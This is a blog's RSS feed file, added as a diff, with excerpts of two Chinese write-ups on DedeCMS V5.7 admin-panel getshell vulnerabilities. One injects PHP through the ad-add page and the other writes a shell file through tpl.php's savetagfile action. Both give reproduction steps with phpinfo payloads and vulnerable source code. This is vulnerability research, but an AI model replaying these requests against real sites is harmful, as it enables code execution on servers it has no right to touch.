@@ -1,0 +1,35 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>DedeCMS on F0rmat&#39;Blog</title>
+    <link>https://getshe11.com/tags/dedecms/</link>
+    <description>Recent content in DedeCMS on F0rmat&#39;Blog</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Fri, 27 Jul 2018 14:14:56 +0000</lastBuildDate><atom:link href="https://getshe11.com/tags/dedecms/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>DedeCMS V5.7后台过滤不当导致Getshell(每周一洞)</title>
+      <link>https://getshe11.com/posts/dedecms-v5.7-background-filtering-improperly-leads-to-getshell/</link>
+      <pubDate>Fri, 27 Jul 2018 14:14:56 +0000</pubDate>
+      
+      <guid>https://getshe11.com/posts/dedecms-v5.7-background-filtering-improperly-leads-to-getshell/</guid>
+      <description>0x01 前言 前两天看到七月火表哥再先知发的一篇审计文章，感觉不错，是dedecms的getshell。就分析了一下，顺便写一篇文章学习。
+0x02 环境 环境和之前的一篇文章一样可以作为参考： https://getpass.cn/2018/03/10/DedeCMS%20V5.7%20SP2%20Background%20Getshell%20Code%20Execution%20Vulnerability/
+0x03 复现漏洞  进入后台添加广告的地方：http://sb.com/dede/ad_main.php 在添加页面加上我们的代码：--&amp;gt;&amp;lt;?php phpinfo();?&amp;gt;&amp;lt;!--  然后点击查看代码  访问执行代码   0x04 漏洞分析 dede\ad_add.php,代码可以读一遍，插入数据库的时候并没有对危险函数进行处理。
+if($dopost==&amp;#34;save&amp;#34;) { csrf_check(); //timeset tagname typeid normbody expbody  $tagname = trim($tagname); $row = $dsql-&amp;gt;GetOne(&amp;#34;SELECT typeid FROM #@__myad WHERE typeid=&amp;#39;$typeid&amp;#39; AND tagname LIKE &amp;#39;$tagname&amp;#39;&amp;#34;); if(is_array($row)) { ShowMsg(&amp;#34;在相同栏目下已经存在同名的标记！&amp;#34;,&amp;#34;-1&amp;#34;); exit(); } $starttime = GetMkTime($starttime); $endtime = GetMkTime($endtime); $link = addslashes($normbody[&amp;#39;link&amp;#39;]); if($normbody[&amp;#39;style&amp;#39;]==&amp;#39;code&amp;#39;) { $normbody = addslashes($normbody[&amp;#39;htmlcode&amp;#39;]); } else if($normbody[&amp;#39;style&amp;#39;]==&amp;#39;txt&amp;#39;) { $normbody = &amp;#34;&amp;lt;a href=\&amp;#34;{$link}\&amp;#34;font-size=\&amp;#34;{$normbody[&amp;#39;size&amp;#39;]}\&amp;#34;color=\&amp;#34;{$normbody[&amp;#39;color&amp;#39;]}\&amp;#34;&amp;gt;{$normbody[&amp;#39;title&amp;#39;]}&amp;lt;/a&amp;gt;&amp;#34;; } else if($normbody[&amp;#39;style&amp;#39;]==&amp;#39;img&amp;#39;) { if(empty($normbody[&amp;#39;width&amp;#39;])) { $width = &amp;#34;&amp;#34;; } else { $width = &amp;#34; width=\&amp;#34;{$normbody[&amp;#39;width&amp;#39;]}\&amp;#34;&amp;#34;; } if (empty($normbody[&amp;#39;height&amp;#39;])) { $height = &amp;#34;&amp;#34;; } else { $height = &amp;#34;height=\&amp;#34;{$normbody[&amp;#39;height&amp;#39;]}\&amp;#34;&amp;#34;; } $normbody = &amp;#34;&amp;lt;a href=\&amp;#34;{$link}\&amp;#34;&amp;gt;&amp;lt;img src=\&amp;#34;{$normbody[&amp;#39;url&amp;#39;]}\&amp;#34;$width$heightborder=\&amp;#34;0\&amp;#34;/&amp;gt;&amp;lt;/a&amp;gt;&amp;#34;; } else { if(empty($normbody[&amp;#39;width&amp;#39;])) { $width = &amp;#34;&amp;#34;; } else { $width = &amp;#34; width=\&amp;#34;{$normbody[&amp;#39;width&amp;#39;]}\&amp;#34;&amp;#34;; } if (empty($normbody[&amp;#39;height&amp;#39;])) { $height = &amp;#34;&amp;#34;; } else { $height = &amp;#34;height=\&amp;#34;{$normbody[&amp;#39;height&amp;#39;]}\&amp;#34;&amp;#34;; } $normbody = &amp;#34;&amp;lt;object classid=\&amp;#34;clsid:D27CDB6E-AE6D-11cf-96B8-444553540000\&amp;#34;codebase=\&amp;#34;http://download.</description>
+    </item>
+    
+    <item>
+      <title>DedeCMS V5.7 SP2后台Getshell 代码执行漏洞(每日一洞)</title>
+      <link>https://getshe11.com/posts/dedecms-v5.7-sp2-background-getshell-code-execution-vulnerability/</link>
+      <pubDate>Sat, 10 Mar 2018 00:11:57 +0000</pubDate>
+      
+      <guid>https://getshe11.com/posts/dedecms-v5.7-sp2-background-getshell-code-execution-vulnerability/</guid>
+      <description>前言 这两天费劲脑力去撩小姐姐，感觉好难啊，还不如审计代码。  环境 Web： phpstudy System： Windows 10 X64 Browser： Firefox Quantum Python version ： 2.7 Tools： PhpStorm 2017.1.1
+复现 漏洞利用  首先访问域名 + /dede/tpl.php?action=upload，在这个页面的源代码中获取到token值。  访问以下地址： 域名 + /dede/tpl.php?filename=shell.lib.php&amp;amp;action=savetagfile&amp;amp;content=&amp;lt;?php%20phpinfo();?&amp;gt;&amp;amp;token=刚才的token值  访问shell的地址：  域名 + /include/taglib/shell.lib.php
+漏洞分析 代码位置和代码 位置： dedecms\dede\tpl.php 代码：
+if(empty($filename)) $filename = &amp;#39;&amp;#39;; $filename = preg_replace(&amp;#34;#[\/\\\\]#&amp;#34;, &amp;#39;&amp;#39;, $filename); 中间省略。。。。。。。。。 else if($action==&amp;#39;savetagfile&amp;#39;) { csrf_check(); if(!preg_match(&amp;#34;#^[a-z0-9_-]{1,}\.lib\.php$#i&amp;#34;, $filename)) { ShowMsg(&amp;#39;文件名不合法，不允许进行操作！&amp;#39;, &amp;#39;-1&amp;#39;); exit(); } require_once(DEDEINC.&amp;#39;/oxwindow.class.php&amp;#39;); $tagname = preg_replace(&amp;#34;#\.lib\.php$#i&amp;#34;, &amp;#34;&amp;#34;, $filename); $content = stripslashes($content); $truefile = DEDEINC.</description>
+    </item>
+    
+  </channel>
+</rss>
